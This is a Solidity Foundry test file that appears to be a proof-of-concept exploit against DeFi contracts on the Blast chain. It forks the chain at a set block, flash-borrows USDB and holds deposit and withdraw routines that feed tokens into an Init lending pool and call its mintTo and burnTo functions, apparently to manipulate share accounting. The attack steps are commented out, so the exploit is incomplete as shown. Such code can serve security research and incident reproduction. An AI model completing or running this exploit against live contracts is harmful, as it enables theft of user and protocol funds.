// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";
import "../test/interfaces/IWETH.sol";
import "../test/interfaces/IERC3156FlashBorrower.sol";
import "../test/interfaces/IUni_Pair_V2.sol";

interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

interface IAlienFinance {

}

interface Initblast {

}
interface IInitCore {
    function mintTo(address _pool, address _to) external returns (uint256 shares);
    function burnTo(address _pool, address _to) external returns (uint256 amt);
}


contract allien_init_test is Test, IERC3156FlashBorrower {
    using SafeMath for uint;
    address private constant blast = 0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad;
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    Initblast private lendingPool = Initblast(0xdafB6929442303e904A2f673A0E7EB8753Bab571);
    IInitCore private initcore = IInitCore(0xa7d36f2106b5a5D528a7e2e7a3f436d703113A10);
    address private attacker;
    uint256 amountdeposit;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6343272);
        attacker = msg.sender;
        vm.deal(address(this), 10.1 ether);
        vm.prank(address(this));
        deal(address(blast), address(this), 10 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(blast).balanceOf(address(this)), 18);

        address token = address(blast);
        uint256 amount = IERC20(blast).balanceOf(address(Allien));  // 250 USDB with 18 decimals

        lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");

        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(blast).balanceOf(address(this)), 18);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee3,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), "Untrusted lender");
        require(address(_token) == address(blast), "Token mismatch");
        require(initiator == address(this), "you are not me");
        emit log_named_decimal_uint("[After] Attacker blast during exploit", IERC20(blast).balanceOf(address(this)), 18);

        // uint256 amountdeposit = 49199686 * 10**18;
        // emit log_named_decimal_uint("amount to deposit to init pool", amountdeposit, 18);

        // deposit();

        // withdraw();

        require(IERC20(blast).approve(address(lender), IERC20(blast).balanceOf(address(this))));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

    function deposit() internal {
        uint256 amountdeposits = 49199686 * 10**18;
        emit log_named_decimal_uint("balance to be deposited", amountdeposits, 18);
        IERC20(blast).transfer(address(lendingPool), amountdeposits);

        uint256 balb4mint = IERC20(blast).balanceOf(address(lendingPool));
        emit log_named_decimal_uint("balance in lendingpool before minting share", balb4mint, 18);

        // 2. call mintTo
        uint256 shares = IInitCore(initcore).mintTo(address(lendingPool), address(this));
        emit log_named_decimal_uint("share in core pool", shares, 18);
    }

    function withdraw() internal {

        //calculate shares to burn
        uint256 sharestoburn = IERC20(address(lendingPool)).balanceOf(address(this));
        emit log_named_decimal_uint("inTokens lending pool", sharestoburn, 18);
        // 1. transfer inTokens to the lending pool
        IERC20(address(lendingPool)).transfer(address(lendingPool), sharestoburn);

        uint256 balb4burn = IERC20(blast).balanceOf(address(lendingPool));
        emit log_named_decimal_uint("balance in lendingpool  before burn share", balb4burn, 18);

        // 2. call burnTo
        IInitCore(initcore).burnTo(address(lendingPool), address(this));
        emit log_named_decimal_uint("balance in lendingpool after burning share", IERC20(address(lendingPool)).balanceOf(address(this)), 18);
        uint256 sharestoafter = IERC20(address(lendingPool)).balanceOf(address(this));
        emit log_named_decimal_uint("inTokens lending pool", sharestoafter, 18);

        emit log_named_decimal_uint("balance bafore repay loan", IERC20(blast).balanceOf(address(this)), 18);
    }
}